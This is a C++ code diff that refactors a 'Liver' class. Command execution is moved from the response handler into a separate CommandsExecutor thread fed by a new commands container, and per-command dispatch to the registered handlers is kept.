@@ -31,10 +31,21 @@ Liver::Liver(Event::Ptr quit_event,
 	m_command_factory(std::move(command_factory)),
 	m_communicator(std::move(communicator)),
 	m_iteration_delay(iteration_delay),
+	m_commands(std::make_shared<CommandsContainer>()),
 	m_products(std::make_shared<ProductsContainer>()),
 	m_libraries(std::make_shared<LibrariesContainer>()),
 	m_figs(std::make_shared<FigsContainer>()),
 	m_operations(std::make_shared<FigOperationsContainer>()),
+	m_commands_executor_thread(
+		std::make_unique<CommandsExecutor>(
+			m_quit_event,
+			m_commands,
+			[this](const ICommand::Ptr& command)
+			{
+				execute_command(command);
+			}
+		)
+	),
 	m_operations_fetcher_thread(
 		std::make_unique<FigOperationsFetcher>(m_quit_event, m_products, m_operations)
 	),
@@ -141,22 +152,19 @@ void Liver::handle_execute_commands(const ExecuteCommandsResponse& response)
 	{
 		commands.push_back(m_command_factory->create(command));
 	}
-	execute_commands(commands);
+	m_commands->insert_all(commands);
 }
 
-void Liver::execute_commands(const std::vector<ICommand::Ptr>& commands)
+void Liver::execute_command(const ICommand::Ptr& command)
 {
-	for (const ICommand::Ptr& command : commands)
+	if (!m_handlers.contains(command->type()))
 	{
-		if (!m_handlers.contains(command->type()))
-		{
-			TRACE(L"unhandled command type: ", static_cast<uint32_t>(command->type()));
-			continue;
-		}
-		const ICommandHandler::Ptr& handler = m_handlers[command->type()];
-		std::vector<IProduct::Ptr> products = handler->handle(command);
-		m_products->insert_all(std::move(products));
+		TRACE(L"unhandled command type: ", static_cast<uint32_t>(command->type()));
+		return;
 	}
+	const ICommandHandler::Ptr& handler = m_handlers[command->type()];
+	std::vector<IProduct::Ptr> products = handler->handle(command);
+	m_products->insert_all(std::move(products));
 }
 
 void Liver::register_handlers()
